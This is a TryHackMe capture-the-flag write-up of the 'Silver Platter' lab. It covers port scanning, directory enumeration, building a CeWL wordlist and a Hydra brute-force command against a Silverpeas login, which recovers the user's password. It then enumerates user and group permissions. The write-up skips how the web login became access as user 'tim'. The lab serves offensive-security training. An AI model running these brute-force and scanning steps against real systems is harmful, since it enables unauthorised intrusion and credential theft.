# Silver Platter (THM)

### Objective

The *Silver Platter* project from TryHackMe aimed to simulate a real-world penetration testing scenario. The objective was to perform reconnaissance, enumeration, exploitation, and post-exploitation on a vulnerable machine, analyzing security flaws and privilege escalations. This hands-on lab strengthened core offensive security skills and improved understanding of system vulnerabilities.

# Skills Learned

- Network enumeration and port scanning using Nmap and Rustscan.
- Web directory discovery using Dirsearch.
- Username and password enumeration.
- Custom password spraying with Hydra.
- Privilege escalation identification and group-based access analysis.
- Understanding of SSH authentication and HTTP service misconfigurations.

# Tools Used

- **Nmap / Rustscan** – for port and service discovery.
- **Dirsearch** – for directory enumeration.
- **Hydra** – for password spraying and brute-force authentication.
- **CeWL** – to generate custom password lists.
- **SSH client** – for remote access and exploitation.
- **Linux command-line utilities** – for post-exploitation and enumeration.

# Steps

### Ref 1: Initial Enumeration

Performed a full port scan to identify open services.
```
nmap -p- [silverplatter] -v -T5
nmap -p 22,80,8080 -A [silverplatter IP] -v -T5

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b1c878afe3416c9f782372b108f8bf1 (ECDSA)
|_  256 266d17ed839e4f2df6cd5317c8803d09 (ED25519)

80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Hack Smarter Security

8080/tcp open  http-proxy
|_http-title: Error
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Mon, 14 Jul 2025 14:03:37 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|_    Connection: close

```
- **Ports Found:**
  - 22/tcp (SSH – OpenSSH 8.9p1 Ubuntu)
  - 80/tcp (HTTP – nginx 1.18.0)
  - 8080/tcp (HTTP-proxy – error page)

### Ref 2: Service Analysis

Used **Rustscan** to confirm open services and identify banner details.
Detected **nginx/1.18.0** and **OpenSSH 8.9p1** running on Ubuntu.
```
ORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b1c878afe3416c9f782372b108f8bf1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ0ia1tcuNvK0lfuy3Ep2dsElFfxouO3VghX5Rltu77M33pFvTeCn9t5A8NReq3felAqPi+p+/0eRRfYuaeHRT4=
|   256 266d17ed839e4f2df6cd5317c8803d09 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKecigNtiy6tW5ojXM3xQkbtTOwK+vqvMoJZnIxVowju

80/tcp   open  http       syn-ack ttl 64 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)

8080/tcp open  http-proxy syn-ack ttl 63
|_http-title: Error
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Mon, 14 Jul 2025 14:19:16 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|_    Connection: close

```
### Ref 3: SSH(22) 
```
┌──(root㉿kali)-[~/lab-work/silverplatter]
└─# ssh root@silverplatter
root@silverplatter's password:
```
SSH uses password-based authentication.

### Ref 4: HTTP (80) Directory Enumeration

Executed **Dirsearch** to discover accessible paths and files:
```
dirsearch -u http://silverplatter.thm/

Target: http://silverplatter.thm/

[16:46:07] Starting:                                                                         
[16:46:31] 403 -  564B  - /assets/                                          
[16:46:31] 301 -  178B  - /assets  ->  http://silverplatter.thm/assets/     
[16:46:48] 301 -  178B  - /images  ->  http://silverplatter.thm/images/     
[16:46:48] 403 -  564B  - /images/                                          
[16:46:52] 200 -   17KB - /LICENSE.txt                                      
[16:47:07] 200 -  771B  - /README.txt   

```
- Discovered:
  - `/assets/`
  - `/images/`
  - `/LICENSE.txt`
  - `/README.txt`

These files confirmed the use of *Silverpeas* web software.

### Ref 5: Username Enumeration


Found potential username via web response:
```
Username: scr1ptkiddy
```
This was gathered during enumeration of the web application’s login interface.

### Ref 6: Password List Generation

Created a **custom password list** using **CeWL**:
```
cewl http://silverplatter.thm > custom_password.txt
```
This list was used for targeted brute-forcing.

### Ref 7: Password Spraying (Hydra)

Used **Hydra** to perform a custom password spray attack:
```
hydra -l scr1ptkiddy -P custom_password.txt silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:Login or password incorrect" -V -t 2
```
- **Successful Credentials:**
  `login: scr1ptkiddy`
  `password: adipiscing`

### Ref 8: Post-Exploitation Enumeration

After accessing the system as user `tim`, executed:
```
sudo -l
id
```
- `tim` could not run sudo but belonged to group **ADM**, indicating log file read permissions.
- Discovered another user: `tyler:x:1000:1000:root:/home/tyler:/bin/bash`

Potential for privilege escalation or lateral movement via `tyler`.

### Ref 9: Key Takeaway

This lab demonstrated:
- Effective enumeration using layered scanning.
- Password spraying with custom-generated lists.
- Privilege escalation awareness and post-exploitation techniques.


